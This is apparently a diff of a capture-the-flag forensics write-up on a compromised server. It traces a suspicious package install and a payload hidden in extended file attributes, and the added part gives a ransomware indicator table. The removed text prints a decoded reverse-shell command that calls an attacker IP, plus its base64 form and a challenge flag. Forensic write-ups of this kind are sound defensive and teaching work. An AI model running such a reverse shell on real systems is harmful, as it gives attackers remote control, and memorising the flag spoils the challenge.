-    <p>Inside /home/cj/core_app/company_secret/app/layout.tsx. We localted the metadata : <br />
-<img src="/assets/CJ-Qual/9.png" alt="alt text" />
-Counting Stock Sectors inside : lib/stock-data.ts<br />
-<img src="/assets/CJ-Qual/10.png" alt="alt text" /><br />
-total : 8</p>
-  </li>
-</ol>
-
-<p>Counting Company List inside the same file : <br />
-<img src="/assets/CJ-Qual/11.png" alt="alt text" /><br />
-Total companies = 40</p>
-
-<p>Answer : <code class="language-plaintext highlighter-rouge">Saham Bos 2025 - Stock Market Dashboard_8_40</code></p>
-
-<ol>
-  <li>
-    <p>Please provide the original state of all the stock codes for Technology Sector-based Stock Code!
-Format: STCK,STCK,STCK,STCK (e.g., NUMA,POCK,RAVA,LEMA)
-From the same file lib/stock-data.ts, we filtered companies where sector==”Technology” and resulted :<br />
-<img src="/assets/CJ-Qual/11.png" alt="alt text" /> <br />
-Answer : TECH,DIGI,CHIP,CLOUD,ELECT,DATA</p>
-  </li>
-  <li>
-    <p>Upon the investigation, we sought another potential threat actor compromising the machine from the different IP but we didn’t see any plain IOC in the server. It looks like this threat actor was first seen in November before the exfiltration event occurs whereas there has been an unauthorized dependency/package installation in the server which we haven’t validated yet. Are you able to find another IP of the attacker and its payload in base64 form?
-Format: ipv4.ipv4.ipv4.ipv4_base64encodedpayload (e.g., 172.16.1.18_ZWNobyAnW3tob3N0czogMTkuMjEzLjQ1LjE2LCB0YXNrczogW3NoZWxsOiAvYmluL3NoIDwvZGV2L3R0eSA+L2Rldi90dHkgMj4vZGV2L3R0eV19XScgPiAkR0FMQUs7IGFuc2libGUtcGxheWJvb2sgJEdBTEFL)</p>
-  </li>
-</ol>
-
-<p>While reviewing persistence artifacts, I noted <strong>a suspicious package installation in November</strong>, prior to the data exfiltration event: /mnt/ubuntu/var/log/dpkg.log
-<img src="/assets/CJ-Qual/12.png" alt="alt text" />
-The attr package is used to manipulate extended file attributes — commonly abused for stealth payload storage. (https://isc.sans.edu/diary/32116)</p>
-
-<p>We scanned /home/cj for hidden xattr metadata and found a <strong>payload embedded</strong> in: /home/cj/frmstarter.script
-<img src="/assets/CJ-Qual/13.png" alt="alt text" />
-Decoded payload : sh -i &gt;&amp; /dev/tcp/192.168.100.137/8281 0&gt;&amp;1</p>
-
-<p>This proves Attacker IP = 192.168.100.137
-Answer : <code class="language-plaintext highlighter-rouge">192.168.100.137_c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xMDAuMTM3LzgyODEgMD4mMQ==</code></p>
-
-<p><img src="/assets/CJ-Qual/15.png" alt="alt text" /></p>
-
-<p>FLAG : 
-<code class="language-plaintext highlighter-rouge">CJ2025{13bf2db2271d235e2c33dc98d45482b1242df9333402f3e02ca83a9def15ac4b}</code></p>
-
-<p>This investigation highlights the importance of going beyond obvious indicators and examining less common persistence vectors. Correlating disk, log, and network artifacts ultimately revealed the complete attacker workflow.</p>
+<table>
+  <thead>
+    <tr>
+      <th>Type</th>
+      <th>Indicator</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>Sepolia RPC</td>
+      <td><code class="language-plaintext highlighter-rouge">ethereum-sepolia-rpc.publicnode.com</code></td>
+    </tr>
+    <tr>
+      <td>Smart Contract</td>
+      <td><code class="language-plaintext highlighter-rouge">0x08FE9fc8288Cf5D5EE5f4F69c0e4f774FFA275d4</code></td>
+    </tr>
+    <tr>
+      <td>Ransomware Extension</td>
+      <td><code class="language-plaintext highlighter-rouge">.jay</code></td>
+    </tr>
+    <tr>
+      <td>Ransom Note</td>
+      <td><code class="language-plaintext highlighter-rouge">README.txt</code></td>
+    </tr>
+    <tr>
+      <td>Ransom Wallet</td>
+      <td><code class="language-plaintext highlighter-rouge">0xcd02c89DeF2A9Aa64598CbA248c37D833AFE92D8</code></td>
+    </tr>
+  </tbody>
+</table>
 
       </div>
     </div>
